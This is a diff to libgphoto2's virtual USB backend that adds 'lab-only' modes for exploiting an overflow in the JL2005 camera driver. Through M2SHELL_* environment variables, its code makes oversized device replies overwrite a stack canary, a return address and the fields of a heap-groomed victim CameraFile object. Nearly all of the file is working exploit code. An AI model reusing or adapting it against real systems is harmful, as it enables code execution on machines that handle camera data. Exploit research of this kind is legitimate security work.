@@ -1,0 +1,108 @@
+# W170 local-only vusb diff, relative to the committed patched tree
+# Apply with `patch -p1` from a plain-build source root after
+# live/vusb-jl2005.patch. Adds modes p/c/v on top of the committed patch.
+
+--- a/libgphoto2_port/vusb/vusb.c
++++ b/libgphoto2_port/vusb/vusb.c
+@@ -32,6 +32,7 @@
+ #ifdef HAVE_SYS_PARAM_H
+ #include <sys/param.h>
+ #endif
++#include <dlfcn.h>
+ #include <string.h>
+ 
+ #include <gphoto2/gphoto2-port.h>
+@@ -174,7 +175,93 @@
+ 		{
+ 			int n = size;
+ 			if (m2[0] == 's' && n > 0x3E20) n = 0x3E20;
++			if (m2[0] == 'p') {
++				const char *ls = getenv("M2SHELL_JL2005_LEN");
++				int lim = ls ? (int)strtol(ls, NULL, 0) : 0x3E38;
++				if (n > lim) n = lim;
++			}
+ 			memset(bytes, 0x5a, (size_t)n);
++			if (m2[0] == 'p') {
++				const char *ts = getenv("M2SHELL_JL2005_TOP");
++				if (ts && n >= 0x3E38) {
++					unsigned long long v = strtoull(ts, NULL, 0);
++					int i;
++					for (i = 0; i < 8; i++)
++						bytes[0x3E30+i] = (char)((v >> (8*i)) & 0xff);
++				}
++			}
++			if (m2[0] == 'c' && n >= 0x3E40) {
++				const char *ks = getenv("M2SHELL_JL2005_CANARY");
++				const char *rs = getenv("M2SHELL_JL2005_RIP");
++				if (ks) {
++					unsigned long long v = strtoull(ks, NULL, 0);
++					int i;
++					for (i = 0; i < 8; i++)
++						bytes[0x3E28+i] = (char)((v >> (8*i)) & 0xff);
++				}
++				if (rs) {
++					unsigned long long v = strtoull(rs, NULL, 0);
++					int i;
++					for (i = 0; i < 8; i++)
++						bytes[0x3E38+i] = (char)((v >> (8*i)) & 0xff);
++				}
++			}
++			/* W170 lab-only: allocate a live CameraFile immediately after
++			 * camera->pl, then let the oversized reply overwrite it. */
++			if (m2[0] == 'v' && n >= 0x3E40) {
++				void **slot = (void **)dlsym(RTLD_DEFAULT, "m2s_victim_file");
++				const char *fs = getenv("M2SHELL_JL2005_FILL");
++				const char *ks = getenv("M2SHELL_JL2005_CANARY");
++				const char *rs = getenv("M2SHELL_JL2005_RIP");
++				unsigned char fill = fs ? (unsigned char)strtoul(fs, NULL, 0) : 0x41;
++				int i;
++				if (slot && !*slot) {
++				{
++					void *drain[64];
++					int d;
++					int nd = 8;
++					const char *ds = getenv("M2SHELL_VUSB_DRAIN");
++					if (ds) nd = atoi(ds);
++					for (d = 0; d < nd && d < 64; d++) drain[d] = malloc(0x180);
++				}
++
++
++					int (*newfile)(void **) = (int (*)(void **))dlsym(RTLD_DEFAULT, "gp_file_new");
++					void *f = NULL;
++					if (newfile && newfile(&f) == 0) {
++						*slot = f;
++						fprintf(stderr, "VUSB_VICTIM %p\n", f);
++					}
++				}
++				memset(bytes, fill, (size_t)n);
++				if (ks) {
++					unsigned long long v = strtoull(ks, NULL, 0);
++					for (i = 0; i < 8; i++)
++						bytes[0x3E28+i] = (char)((v >> (8*i)) & 0xff);
++				}
++				if (rs) {
++					unsigned long long v = strtoull(rs, NULL, 0);
++					for (i = 0; i < 8; i++)
++						bytes[0x3E38+i] = (char)((v >> (8*i)) & 0xff);
++				}
++				{
++					const char *names[3] = {"M2SHELL_VUSB_ACCESSTYPE",
++						"M2SHELL_VUSB_SIZE", "M2SHELL_VUSB_DATA"};
++					int off[3] = {0x3F90, 0x3F98, 0x3FA0};
++					int k;
++					for (k = 0; k < 3; k++) {
++						const char *vs = getenv(names[k]);
++						if (vs) {
++							unsigned long long v = strtoull(vs, NULL, 0);
++							int j;
++							for (j = 0; j < 8; j++)
++								bytes[off[k]+j] = (char)((v >> (8*j)) & 0xff);
++						}
++					}
++				}
++				if (getenv("M2SHELL_DEBUG"))
++					fprintf(stderr, "VUSB_VICTIM_MODE fill=%02x n=%d\n", fill, n);
++			}
+ 			return n;
+ 		}
+ 	}
